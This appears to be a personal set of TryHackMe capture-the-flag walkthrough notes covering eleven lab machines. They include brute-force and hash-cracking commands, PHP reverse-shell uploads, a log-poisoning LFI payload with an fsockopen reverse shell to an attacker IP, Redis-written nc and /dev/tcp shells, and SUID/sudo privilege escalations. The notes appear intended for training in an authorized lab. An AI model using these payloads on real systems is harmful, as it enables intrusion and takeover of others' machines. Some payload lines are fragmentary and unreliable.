Try HackMe--> https://tryhackme.com/dashboard

Pickle Rick [solved]
============
Launch Attacking machine in tryHackMe
enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.70.30 -oA nmap
	Found two services running 1) Openssh 7.2p2 2) running on 22 port, Apache 2.4.18 running on 80 port
	
	searched exploits for Openssh 7.2

	Below exploits did not work
	===============================================
	msf > use auxiliary/scanner/ssh/ssh_enumusers
	msf auxiliary(ssh_enumusers) > show actions
    	...actions...
	msf auxiliary(ssh_enumusers) > set ACTION < action-name >
	msf auxiliary(ssh_enumusers) > show options
    	...show and set options...
	msf auxiliary(ssh_enumusers) > run
	================================================

	Not tried this, need to try next time
	======================================================
	msf > use auxiliary/scanner/http/apache_optionsbleed
	msf auxiliary(apache_optionsbleed) > show actions
   	 ...actions...
	msf auxiliary(apache_optionsbleed) > set ACTION < action-name >
	msf auxiliary(apache_optionsbleed) > show options
    	...show and set options...
	msf auxiliary(apache_optionsbleed) > run
	========================================================

	Apache running on port 80, so open webserver on web browser--> nothing found in front page/UI
	view page source-> found username "RickRul3s
	open robots.txt-> found some random alphanumeric value   (guessing this as password)

	Next find sub directories , using DirBuster, Gobuster tools-- > Found login.php page exists
	-------------------------------------------
	dirb http://10.10.70.30 /usr/share/wordlist.txt
	-----------------------------------------
	Try login via browser-  http://10.10.70.30/login.php, -> username as we found during view page source and password guessed from Robots.txt
	Login success
	Found command input page in webserver, check which are OS commands working, E.g cat, ls, find, home,grep,less, pwd, head,tail
	Found that except pwd, ls, less remaining commands not working
	output of pwd-?/var/www/html
	output of ls-> found clue.txt, and Suser3* file
	try to see content of clue,txt using less command (cat command not working so) -> less clue.txt

	From the clue.txt  found string, to get ingredients navigate throught file systems
	Try seeing content of Suser3* file-> lss Suser3* file-> Found First ingredient

	search for home directory
	less /home-> Found Rick directory
	inside Rick directory (less /home/Rick) found 2nd ingredient)-> less /home/Rick/"second ingredients"
	
	//check for super user permission
	sudo -l   ---> Found (ALL) NOPASSWORD:ALL  ---> means any user can run any command without login required

	sudo file format as below
	[Any user] [any host]:[on behalf of any user] [any command]
	meaning of above is, any user on any host can run any command on behalf of any user

	search in root directory, to search in root directory normal user need super user permission, in sudo file format if permission given for execute any command y any user then
	sudo ls /root--> found 3rd.txt file
	contents of 3rd.txt file given 3rd ingredient ( sudo lss /root/3rd.txt

=====================================================================================================================
Boiler CTF

enumerate machine with NMAP  --> nmap -T5 -p- -sV -vv 10.10.100.67 -oA nmap
	ftp anon Anonymous login 
	ftp port 21 open vsftpd 3.0.3

	try ftp login as username Anonymous
		ftp 10.10.100.67
	After login success
	ftp>ls ---> to list file, does not see any files here
	
	search for hidden files
	ftp> ls -la--> found .info.txt
	
	Download  .info.text
	fp> get .info.txt

	ftp>exit

	>cat .info.txt--> found some encoded value
	Try decode using cyberchef website  https://gchq.github.io/CyberChef/
	

	//To find what service running on port 10000
	nmap -p100000 10.10.100.67

	10000/tcp http Minserve 1.930 (Webmin httpd)
	
	//To find exploitable
	google for any available exploits and also can search using searchsploit

	
	//find highest port and service

	//To find what CMS running on webserver
	use gobuster 
	>gobuster dir http://10.10.100.67/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 25

	//based on hint enumerate further
	>gobuster dir http://10.10.100.67/joomla/ -w /usr/share/dirb/wordlists/medium.txt -t 25

	During enumeration we get unusual files like , file starts with _, try ccess that path in browser, we get index page

	search on sar2html and also catthat file and see what we get information
	got credentials , try ssh
	ssh bastard@10.10.100.67 -p 5500 and enter password when prompt
	after login search for any interesting file-> .secret file-> cat this file-> get another user credentials
	ssh to second user account, and list files, get backup.sh file, cat it and get flag
	
	if any file has suid bit set and if any normal user executes that file , that normal user get inherits the suid property
	in linux find command searches all files from root level

	umask command in linux for assign permissions
	suid for directory is 4, files 2, sticky bit 0
	so find which file permission is set with suid--> find / -perm /4000 2>/dev/null
	 ( where 4000- 4 is to check which directory have set suid , 000 is file permission by default for files 666, drectory permission by default 777)

	/usr/bin/find  is having suid, othes are like false positive

	To become effective user, 1) run any command with /usr/bin/find  or 2) add current user as sudo 3) change file permission to 777
	> /usr/bin/find . -exec chmod -R 777 /root \; 
	>ls -al /root
	>cat root/root.txt----> get the flag

==============================================================================================================================
Cyborg 

	Nmap IP address
	visit website, view page source, search for any info- no interesting information
	Directory bruteforcing
	Got admin panel, found Alex is user, enumerate more on the website, got clues like squidfroxy, music-archive
	Download tar file t see whats inside
	in readme file from downloaded tar  has URL
	From dirbuster search found /amin and /etc folder
	Navigate to /etc from browser, found squid (which has hashed password ) /passwd,
	search $apr1$ in google- found like it  apache generated algorith password- MD5
	use hashcat to decrypt
	hashcat -h | grep apr1   --->  found that 1600
	hashcat -a 0 -m 1600 hash rockyou.txt --force   (where has is hash value we found and stored with file name as hash)-- got password as "squidward"
	Previously we gor URL from read me file, in that we have URL, navigate to that URL in browser
	from above URL, we see some installation steps of borgbackup, follow installation step provided in installation tab
	After installation , extract music-archive which e have unzipped earlier
	from linux machine search , borg -h and man borg- > found usage syntax -> borg extract /path/to/repo/:password
	>borg list /path/to/repo/:Music-archive-> found note.txt-> cat this file-> found Alex user credentials
	ssh to alex@ipaddess   -> enter password when prompt for
	After login found user.txt file which is a flag

	next step is get root access
	sudo -l  ( to find anything alex run with root privilizes) -> got /etc/mp3backups/backup.sh
	cd to /etc/mp3backups and cat backup.sh
	Found cmd=$command , c $command , we can execute command like >sudo backup.sh -c whoami -> shows as root
	//To make privilize escLtion
	>sudo backup.sh -c /bin/bash /   --> success of privilize escalation for /bin/bash
	After privilize escalation check for whether we became root user?
	>whoami  //not shown any output, may be working

	Another way to see content of root.txt as follows
	> cat root/root.txt /root/flag.txt   // to make loacl copy

	create suid to execute as root user to see content of root.txt
	>chmod 4577 /bin/bash     //giving root permission for /bin/bash to execute commands as root
	exit from current directory enter >exit
	
	//switch to bash 
	>bash -p   //bash interactive shell
	>whoami   //output shown as root , so we are good to go for read root.txt

	cd /etc/mp3backups
	>ls

	repeat agin
	>chmod 4577 /bin/bash 
	
	>bash -p   //bash interactive shell
	>whoami   //output shown as root , so we are good to go for read root.txt
	
	=====================================================================================
	RootMe
	
	visit website, view page source
	nmap -sC -sV -oN scan 10.10.104.71
	gobuster search -?  /upload  --> we can upload malicious file
	https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
	from above link download php malicious filesave as pp5 , change IP address and port
	Then upload, if upload success
	
	bash
	>nc nvlp 1337 
	
	//click on uploaded malicious file over server/application and see u get reverse shell

	upgreade our shell
	search  How to get linux shell using python
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

	python -c 'import pty; pty.spawn("/bin/bash")'

	search for flag file
	find / type -f -name user.txt
	cat /var/www/user.txt    //got flag


	escalate user privilizes to get as root
	>find / type f -user root -perm 4000 2>/dev/null

	https://gtfobins.github.io/     //Priilege escalations docs  , type python  and select SUID
	will get below command 
	./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

	from find command we got /usr/bin/python   so modify above command as belo & run
	
	./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	then we get root permission

	cat root/root.txt

====================================================================================================
AgentSudo

	Nmap scan, port 80,21,22 ports are open
	visit website, view page source
	Do nikto scan
	Do gobuster scan to find subdirectories
	curl "http://10.10.173.151" -H "User-Agent:C" -L

	>hydra -l chris -p /path/to/rockyou.txt ftp:10.10.173.151
	foound credential chris/crystal

	>ftp 10.10.173.151  --> enter username & password- > Login success
	//download all files
	ftp>mget *
	cat the downloaded txt file to get clues
	
	//find anything is there in jpg files
	>strings*.jpg
	>strings*.png

	binwalk -e cute.png  //extract the files inside image
	navigate inside the extracted folder

	//unzip the zip files
	>unzip 8702.zip
	
	>7z e 8702.zip   //need password

	>/opt/jhonTheRipper/run/Zip2john 8702.zip    //we see some hash value
	>/opt/jhonTheRipper/run/Zip2john 8702.zip > hashes_for_john.txt
	>/opt/jhonTheRipper/run/john hashes_for_john.txt --wordlist=/opt/rockyou.txt   -> Found password

	>7z e 8702.zip  //enter password

	>cat To_agentR.txt   //to check any info , Found some encrypted value, its random Upper case alphabet, may be Base64
	>echo QXJlYTUx | base64 -d    -> found decrypted value
	
	>steghide extract -sf cute-alien.jpg   // enter password we got e from decrypted, after password enter got jpg file extracted

	>ls // Found some txt file, cat displayed password & user james

	//Try to ssh
	>ssh james@10.10.173.151   //enter password we found above -->login success
	james@ >ls //search for any flag files  --> found flag

	//from other terminal bash , where we downloaded files
	//search for any strings inside Alien_autospy.jpg
	>strings Alien_autospy.jpg   //not found any useful info
	>exiftool Alien_autospy.jpg //not found any useful info

	image base search in google

	scp-> secured copy protocol
	SCP Command Syntax--> scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2

	scp james@10.10.173.151:/Alien_autospy.jpg .
	>eog Alien_autospy.jpg  //opens image file
	
	>strings Alien_autospy.jpg  // to find anything interest info
	>exiftool Alien_autospy.jpg  // to find anything interest info

	Google image search   //upload this image and found some information about event

	//privilege-escalation-awesome-scripts-suite
	Download this linpeas.sh tool from   https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
	
	scp /opt/linpeas.sh james@10.10.173.151:/dev/shm
	
	james@agent-sudo:$ cd /dev/shm
	james@agent-sudo:/dev/shm$ls  //linpeas.sh
	
	$chmod +x linpeas.sh
	$./linpeas.sh

	$sshpass -p "hackerrles!" ssh james@10.10.173.151
	$sudo -l   //found (ALL, !root)  /bin/bash

	$ sudo -u#1 /bin/bash    //which buffer overflows and make privilege as root, here user id -1 does not exists
	After execute above command , switched to root@agent-sudo:# 
	root@agent-sudo:# ls  // found user_flag.txt
	
	root@agent-sudo:# cd /root
	root@agent-sudo:# ls  //root.txt
	root@agent-sudo:# /root#cat root.txt   //found flag



======================================================================================
 TomGhost
	nmap scan-> 
	22/tcp ssh
	53/tcp tcpwrapped
	8009/tcp ajp13 Apache Jserv v1.3
	8080/tcp http Apache Tomcat 9.0.30

	goto exploit db webpage and search tomcat , Found "Apache Tomcat - AJP 'Ghostcat File Read/Inclusion"
	
         copy code from https://www.exploit-db.com/exploits/48143 & save as python file
	and run -> python code.py <IP addr of webserver>   --> got credentials
	
	ssh with above credential
	ssh skyfuck@10.10.127.181   -> enter yes, then password -> login success
	skyfuck$ ls, Found credentials.pgp and 1 more file
	skyfuck$ cd /home/  -> merlin skyfuck    folders found
	>cd merlin/
	>ls  //found user.txt
	>cat user.txt --? got flag

	//lets do privilize escalation
	>sudo -l   , enter password when prompt //error user skyfuck may nt sudo on ubuntu

	skyfuck@ubuntu:/home/merlin$cd ~   //to navigate to main folder
	skyfuck@ubuntu:$ls
		creentials.pgp  tryhackme.asc

	skyfuck@ubuntu: python3 -m http-server     //started server to host our files, note down port number once started server for file browse

	browser-> 10.10.127.181:8000 --> download above 2 files

	we can download file using scp protocol
	>scp tryhackme.asc kali@IP address of attacker machine:/home/kali/tryhackme ( path to store)

	decrypt the pgp file
	>gpg --decrypt credentials.pgp    //failed error decryption failed: No secret key
	we need to find secret key to decrypt above file

	root@kali: gpg2john tryhackme.asc > tryhackme.hash    //hash file created

	root@kali:jhon tryhackme.hash --wordlist=/path/to/rockyou.txt    //found password

	try to import tryhackme.asc
	>gpg import tryhackme.asc-> asked for passphrase enter above password we got recently

	//Now try decrypt
	>gpg --decrypt credentials.pgp   //asked for passphrase enter above password we got recently
	decrypt successful and we got password for merlin user

	try login merlin as su
	skyfuck@ubuntu: su merlin  //enter password we got from above step --> SUCCESS
	merlin@ubuntu:/home/skyfuck$ sudo -l   //(root:root) NOPASSWD: /usr/bin/zip
	
	GTFOBins site, search for ZIP  suid 
	https://gtfobins.github.io/gtfobins/zip/
		
	It can be used to break out from restricted environments by spawning an interactive system shell.

	//enter below commands on by one
	TF=$(mktemp -u)
	zip $TF /etc/hosts -T -TT 'sh #'
	rm $TF

	After enter above commands check we got as root
	>whoami   //shown root
	
	>cat /root/root.txt   //Found flag

======================================================================================
MR ROBOT CTF
	Enumeration
	-----------
	nmap -sV -sC -oA 10.10.12.13
	3 ports open 22/tcp closed ssh
	80/tcp open http
	443/tcp open ssl/http Apache

	visit 10.10.12.13 & robots.txt in browser
	Found fsocity.dic & key-1-of-3.txt
	download dic file

	terminal
	>gobuster dir -u http://10.10.12.13 -w /opt/directory-list-2.3-small.txt -t 100 -p -o scans.txt
	Found few interesting locations   /wp-lgin.php

	intercept lgin page with burpsuite

	terminal
	>hydra -L  Elliot -P fsocity.dic 10.10.12.13 http-post-form "/wp-login.php:log=^USER&pws=^PWD^:Invalid username -t 30 
	
	Try wp-login 	, user name Elliot & wrong password, see error phrase

	>hydra -l  Elliot -P fsocity.dic 10.10.12.13 http-post-form "/wp-login.php:log=^USER&pws=^PWD^:The password you entered for the username -t 30 
	we can use wp-scan tool to bruite force
	Found password ER28-0652
	Login to wordpress page as Elliot,role- editor
	
	crawel the site and see anywhere we can edit/upload malicious PHP file (download reverse PHP file from testmonkey github)

	terminal- start nc listener
	>rlwrap nc -lvnp 53    (53- is the DNS port)

	Go to Wp application page-> Edit Themes-> paste php reverse shell code and modify IP & port (53)

	visit  http://10.10.12.13/wp-content/themes/twentyfifteen/archive.php
	After visit or execute malicious php file, we can see we got shell
	>whoami   //daemon
	>ls /home  //robot
	>cd /home/robot  //key-2-of-3.txt, password.raw-md5
	>ls -lsa  //key-2-of-3.txt   , all users can read only
	>cat password.raw-md5  //Found password  in hash format
	
	//Try decrypt using john
	>john md5.hash --wordlist=fsocity.dic --format=Raw-md5    //password decrypted

	//--format=Raw-md5  is guess to save time

	Note: hashidentifier tool can use for identify type of hash

	//Goto robot user shell
	& //upgrade current php shell using python command
	>python -c 'import pty;pty.spawn("/bin/bash")'
	daemon@linux:/home/robot$

	as we know there is an robot user, login to robot as super user
	daemon@linux:/home/robot$su robot  //enter password we gor above(decrypted)

	robot@linux$whoami   //robot

	//escalate to root user
	look for suid binaries that has suid bit enabled
	robot@linux$fin /-perm +6000 2>/dev/null | grep '/bin/'

	from above command output we can see /usr/local/bin/nmap
	search for GTFOBins
	robot@linux$/usr/local/bin/nmap -interactive

	//we got nmap interactive shell
	nmap>!sh
	#whoami  //found root
	firstboot_done key-3-of-3.txt

==================================================================================
#8 Blog
	nmap scan
	visit website
	wpscan --url 10.10.176.147 -e u 
		Gives user names and wordpress version and potential metasploit module name we can use for exploit
	save above user lists as user.txt to brute force and get credentials

	wpscan --url 10.10.176.147 -U user.txt -P /path/to/rockyou.txt
		found password-> Login success into wordpress

	search for wordpress version specific exploits from rapid-7- got
	spinup msfconsole
	exploit success with msf
	>shell
	>ls
  -> found config file, cat it and see- got DB credentials
	login to wordpress with DB credentials
	
	>whoami  www-data
	>cd /home   //found user.txt, cat it for flag (but file content was TRY HARD to get flag)
	
	now we goback to meterpreter shell terminal, but in the shell we have not yet got into any user account
	>cd /tmp (in meterpreter shell terminal)
	we have to do more enumeration in 2 ways 1) copy linux-smart-enumeration tool into meterpreter shell   //download from https://github.com/diego-treitos/linux-smart-enumeration
	meterpreter>upload lse.sh
	meterpreter>shell
	meterpreter>chmod 755 lse.sh
	meterpreter>./lse.sh   (password for www-data we dont know , so just press enter to continue)

	From above script, found /usr/sbin/checker has suid permission
	back to meterpreter shell after exiting from above script scan and execute ./checker to see we are admin or not download same file for more examination
	
	meterpreter>download checker
	
	after download the file into our local machine, use cutter tool to decode
	>./cutter and select file to decode, read main code and understand
	>EXPORT admin=admin
	>echo $admin
	meterpreter>./checker   //root
	now we wre root user
	>cd /root
	>cat root.txt    //Found flag

	to get usb flag
	>cd /
	>ls  //usb
	> cd /media/usb
	>ls //usr.txt  //Found flag

=================================================================================================
#9 Startup
 
	nmap scan-> found ftp(21) ssh(22), http(80) are open
	Anonymous ftp login enabled- we can try for ftp login

	>ftp IP address, user name=Aonymous, Password no need- Login success
	>ascii   //before download files change to ascii mode so that we can see file content properly
	ftp>ls -la
	important.jpg
	notice.txt
	ftp (directory)

	//download above files
	ftp>get important.jpg notice.txt
	
	if downloaded files corrupted after downloaded using ascii mode switch back to binary mode (just ogin as usual w/o ascii
	ftp>cat notice.txt  //found user name maya , and hint: download option is there

	confirm webappication built with wappelyzer browser addon (to check aspx,php)
	
	visit webserver and view source //nothing useful found
	
	//brute force directories using gobuster
	>gobuster dir -u IP address> -w <word list path>

	after bdirectory traverse search  found /files
	http://<IP addr>/files    //found same above files (asftre ftp login)

	upload PHP reverse shell (from pentestmonkey site)
	ftp> cd ftp  //ftp (directory) has rwX permission
	ftp>put shell.php
	
	//start nc listener
	>sudo nc -nvlp 1234
	
	http://<IP addr>/files   //and see shell.php file inside ftp folder, click on shell.php and see we got shell in netcat
	
	//stabilize shell
	www-data@startup>python -C "import pty;pty.spawn('/bin/bash')"
	www-data@startup>ls;pwd   //listed recipe.txt and incidents folder (has lowest privilize)
	www-data@startup>cat recipe.txt  //ASCII text present
	
	www-data@startup>cd incidents
	www-data@startup:/incidents>ls    //listed suspecious.pcapng

	//open suspecious.pcapng with wireshark to check previous transaction , to find usefull info
	
	//tryto copy pcap file to /var/www/html/ftp
	www-data@startup:/incidents>cp suspecious.pcapng /var/www/html/ftp   //permission denied

	//check netcat installed on www-data@startup:/incidents>
	www-data@startup:/incidents>which nc   // /bin/nc

	//from other terminal start netcat listener- purpose is to copy suspecious.pcapng into our local machine
	>nc -lvp 4444 > sus.pcap 
	
	www-data@startup:/incidents>nc 10.11.17.148 4444 (other terminal VM IP add is local machine)
	
	//received suspecious.pcapng , saved as sus.pcap
	from local machine terminal
	>ls -la   //listed susp.pcap
	>wireshark susp.pcap   //to see content of file, filter http/tcp  transactions
	tcp.port=4444    //found last user tried t loin with credentials
	
	www-data@startup:/incidents>cd /home
	www-data@startup:/home>$ls -la   //listed lennie
	www-data@startup:/home>$cd lennie   //permission denied
	www-data@startup:/home>$su lennie  //enter password we got inside pcapng file
	lennie@startup:/home>$id   //shows uid,gid etc
        lennie@startup:/home>cd lennie
	lennie@startup$ls   //listed Documents scripts user.txt
	
	//Documents directory has only jokes, nothing special
	
	 //cd into scripts folder
	lennie@startup:-/scripts$ ls -la   //liste planner.sh (cron job, runs at particular period) & startup_list.txt

	planner.sh has execute permission oly to root user	
	lennie@startup:-/scripts$cat planner.sh   //see some code  which has /etc/print.sh  & echos environment variable 
	
	Note: we should not only concentrate on only script, also should see we can edit script, and see anyother sripts inside it, any library files we can make use to exploit
		
	//lets see we have execution permission for /etc/print.sh
	lennie@startup:-/scripts$ ls -la /etc/print.sh   //yes lennie has execute permission, lennie is owner of this file

	lennie@startup:-/scripts$cat /etc/print.sh  //see script what it doing

	//copy all files under root directory into user lenie directory to make it execute with root permission
	then change the file permission and append into /etc/print.sh file (which has required permission)

	lennie@startup:-/scripts$echo "cp /root/+ /home/lennie; chmod 777 /home/lenie.*" >> /etc/print.sh

	lennie@startup:-/scripts$cat /etc/print.sh  //see above content written 
	
	lennie@startup:-/scripts$cd /home/lennie

	wait for a minute to crone job get executed, once executed
	lennie@startup:-$ls -la  //root.txt file present (this file is copied from root user directory)

	lennie@startup:-$file root.txt  //flag found

=============================================================================
#10 Dogcat-  Writesup https://fmash16.github.io/content/writeups/tryhackme/thm-DogCat.html  ,,https://shishirsubedi.com.np/thm/dogcat/#downloading-shellsh
	Nmap scan- 
	Open ports: * 22 - SSH * 80- http
	We have a look at the webpage where it lets us view some dot or cat pictures
	page is running a php that shows the pictures stored in the dogs/ or cats/
	
	//We try some basic LFI 
	http://10.10.174.171/?view=../../../../../../../etc/passwd     //fails showing that only dogs or cats are allowed

	//try adding “dog” after a null byte %00  
	http://10.10.174.171/?view=../../../../../../../etc/passwd%00dog    //We see that we do bypass the string check but it fails to open a the file
	we find that the script also adds the extension .php to the end of the file

	Local File Inclusion
	Googling a bit, we find a new php LFI technique found
	https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion    //which is a great source for pentesters.

	We use the technique to get our base64 encoded php source of dog.php and decode it to view the source.
	http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog
  
	Now we see that we can also check the source of the index.php file using directroy traversal in the same way
	http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index

	interesting here is that it allows us to pass an “ext” variable that contains the file extension.
	On the variable being unset, it adds the default extension of .php

	check now if we can read the /etc/passwd file     //we can!
	check if we can find the log file where it logs all our requests. After fiddling around for a bit, 


	LFI to RCEPermalink
	https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/
	We can read sensitive files, so what? It would be great if we could read a private key for a user if he/she has one in his/her .ssh directory. But turned out here was not. So I kept searching for the ways to use this lfi to get rce. This post explains different ways to achieve code execution using a local file inclusion. We can achieve this if we have permissions to read one of these files:

	/var/log/apache/access.log
	/var/log/apache/error.log
	/var/log/vsftpd.log
	/var/log/sshd.log
	/var/log/mail
	/proc/self/environ
	/proc/self/fd


	we find the logs in the /var/log/apache2/access.log finding out that the server is running apache2
	http://10.10.11.194/?view==dog/../../../../../../var/log/apache2/access.log&ext=

	We see that the log also saves our user-agent header, in our case, Mozilla Firefox
	So, we check if we can inject some php code into our user-agent header

	We can do this using burpsuite repeater to test again and again.
	We change the header to hello to test and it works
	GET view=dog/../../../../var/log/apache2/access.log&ext= HTTP/1.1

	Now we test some php commands. First we try the system(“”) which is suposed to execute the command on the machine and print us the output
	<?php system("ls")?>
	GET view=dog/../../../../var/log/apache2/access.log&ext= HTTP/1.1

	GET /?view==dog/../../../../../../var/log/apache2/access.log&ext= HTTP/1.1
	Host: 10.10.11.194
	User-Agent: <?php system("ls")?>
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate
	Connection: close
	Upgrade-Insecure-Requests: 1

	But executing this once, we somehow break the machine and cannot access the log any more
	system($_GET['cmd']);
	GET view=dog/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/

	user-agent: <?php system($_GET['cmd']); ?>

	We try some commands and see that we are www-data, we try getting a reverse shell using php. The php reverse shell:
	php -r '$sock=fsockopen("10.8.6.75", 8888);exec("/bin/bash -i <&3 >&3 2>&3");'

	We must url encode the revshell passed in the command. The url encoded request stands:
	Reference-> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php

	10.10.12.161/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php -r '$sock=fsockopen("192.168.220.133",1337);exec("/bin/bash -i <&3 >&3 2>&3");'
	Note: Encode php -r '$sock=fsockopen("192.168.220.133",1337);exec("/bin/bash -i <&3 >&3 2>&3");

	We start a nc listener on port 1337 and get the reverse shell.
	
	$flag1
	>ls
	we find the flag.php in the current folder. We cat out the contents to get the flag.
	
	flag1=“THM{Th1s_1s_N0t_4_Catdog_ab67edfa}”

	##flag2
	After digging around the files for a bit, we find our second flag in the /var/www directory.
	flag2 = THM{LF1_t0_RC3_aec3fb}

	## Privilege escalation - Root
	find that our user can execute /usr/bin/env as sudo using the command sudo -l

	We look for privesc using env in gtfobins   https://gtfobins.github.io/gtfobins/env/#shell
	We find that a simple env /bin/sh gives us the shell. So we try that.
	
	www-data@xxxx:var/www sudo /user/bin/env /bin/sh    //now we gor root privi

	flag3
	And, we have escalated to root successfully. lets look for the remaining flags.We find our 3rd flag in the /root directory.
	flag3 = “THM{D1ff3r3nt_3nv1ronments_874112}”

	Looking around for a bit, we find a .dockerenv file in the root directory, which tells us that we are running inside a docker container.

	we find an interesting folder in the /opt/backups directory, having a look at the backup.sh file, we find the following
	tar cf /root/container/backup/backup.tar /root/container

	backup.tar file we found. It might be running a cron job. We see that we have write permissions to the file and so, lets try writing a reverse shell into the backup.sh file.

	open up a netcat listener on port 8888 and after some time, get a shell back from root.
	This time, we see that we are on the machine iteself and not inside a docker container. Going into the root home, /root, we fine our flag4:
	flag4 = “THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}”

============================================================================================
#11 redis
	https://jc01.ninja/ctf/res/
	https://book.hacktricks.xyz/pentesting/6379-pentesting-redis  Pentesting Redis

	james@ninja:~$ nmap -sV -v -p- 10.10.105.18
	PORT     STATE SERVICE VERSION
8	0/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
	6379/tcp open  redis   Redis key-value store 6.0.7
	From our initial recon, we have two ports open. Apache, and Redis.

	From a gobuster scan with dirb big and dirbuster medium, we find nothing. Nothing isn't very interesting, so let's move on
	
	start enumerating Redis.
	>sudo apt install redis-tools

	we can try to connect to Redis without credentials
	redis-cli -h 10.10.105.18
	
	Looking into Redis RCE gave me this resource. At a guess, I assumed we were able to write to /var/www/html as we are likely to be able to convert file writes to RCE using this as there's a webserver with Apache.
	https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
	By writing a PHP file using redis, we can then navigate to it in our browser to cause Apache to run the code. In this case, we're starting out with phpinfo to check our RCE. Then we can move on to trying reverse shells.

james@ninja:~$ redis-cli -h 10.10.105.18
10.10.105.18:6379> help
redis-cli 6.0.8
To get help about Redis commands type:
        "help @" to get a list of commands in 
        "help " for help on 
        "help " to get a list of possible help topics
        "quit" to exit

To set redis-cli preferences:
        ":set hints" enable online hints
        ":set nohints" disable online hints
	Set your preferences in ~/.redisclirc
	10.10.105.18:6379> config set dir /var/www/html/
	OK
	10.10.105.18:6379> config set dbfilename redis.php
	OK
	10.10.105.18:6379> set test ""
	OK
	10.10.105.18:6379> save
	OK
	10.10.105.18:6379> set test '&1|nc 10.x.x.x 4242 >/tmp/f")?>'
	OK
	10.10.105.18:6379> save
	OK
	10.10.105.18:6379> set test "&1|nc 10.x.x.x 4242 >/tmp/f\")?>"
	OK
	10.10.105.18:6379> save
	OK
	10.10.105.18:6379> set test "& /dev/tcp/10.x.x.x/4242 0>&1'\"); ?>"
	OK
	10.10.105.18:6379> save
	OK
	10.10.105.18:6379> exit
	That last payload worked, and we got a connection in our netcat listener. I recommend using rlwrap, as it allows you to use arrow keys in your reverse shell more easily

	james@ninja:~$ rlwrap nc -lvnp 4242
	listening on [any] 4242 ...
	connect to [10.x.x.x] from (UNKNOWN) [10.10.105.18] 46706
	bash: cannot set terminal process group (760): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@ubuntu:/var/www/html$ 
	
Privesc
	We're a low priv user, so let's start enumerating to attempt to get some more permissions. As we're www-data and SSH isn't open, 
	we can't use SSH to get a more stable shell so we'll have to stick with this for now.

	www-data@ubuntu:/var/www/html$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;           
	-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
	-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
	-rwsr-xr-x 1 root root 40152 Jan 27  2020 /bin/mount
	-rwsr-xr-x 1 root root 40128 Mar 26  2019 /bin/su
	-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
	-rwsr-xr-x 1 root root 27608 Jan 27  2020 /bin/umount
	-rwsr-xr-x 1 root root 71824 Mar 26  2019 /usr/bin/chfn
	-rwsr-xr-x 1 root root 18552 Mar 18  2020 /usr/bin/xxd
	-rwsr-xr-x 1 root root 39904 Mar 26  2019 /usr/bin/newgrp
	-rwsr-xr-x 1 root root 136808 Jan 31  2020 /usr/bin/sudo
	-rwsr-xr-x 1 root root 54256 Mar 26  2019 /usr/bin/passwd
	-rwsr-xr-x 1 root root 75304 Mar 26  2019 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 40432 Mar 26  2019 /usr/bin/chsh
	-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
	-rwsr-xr-- 1 root messagebus 42992 Jun 11 13:06 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
	-r-sr-xr-x 1 root root 13628 Sep  1 17:25 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
	-r-sr-xr-x 1 root root 14320 Sep  1 17:25 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

	Using the find command, I found that xxd had the SUID bit set. Let's try to exploit this!
	Checking the GTFOBins entry for xxd reveals that we have arbitrary file read and write as root.

	File read/write as root is great, we can grab the root flag right now if we want.
	 Just getting the root flag isn't very interesting, and OSCP and similar certifications expect you to get a root shell.

	We can write to any file on the system. Exploiting this, we can add our own root user to /etc/passwd and log in. As always, 
	PayloadsAllTheThings to the rescue here! It's worth remembering that we need to upgrade our shell using python here so that we can use su or sudo.
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#writable-etcpasswd

	www-data@ubuntu:/tmp$ cat /etc/passwd > passwd
	www-data@ubuntu:/tmp$ echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> passwd                      
	www-data@ubuntu:/tmp$ cat /tmp/passwd | xxd | xxd -r - /etc/passwd
	www-data@ubuntu:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
	www-data@ubuntu:/tmp$ su hacker
	Password: hacker
	root@ubuntu:/tmp# 

	Alternately, we could have created an /etc/sudoers entry to grant ourself sudo rights.

	Getting the user's password
	I'm sure the intended method was cracking this password first, and then using it to privesc with the ALL ALL sudo. As we had arbitrary file read as root, we could have dumped the shadow file earlier on and attempted to crack hashes

	From our root shell, we can cat /etc/shadow, grab vianka's password hash and use John The Ripper or Hashcat to crack it. On my laptop, this took 1 second to crack so if it's taking much longer for you then something might be going wrong

==================================================================================================================










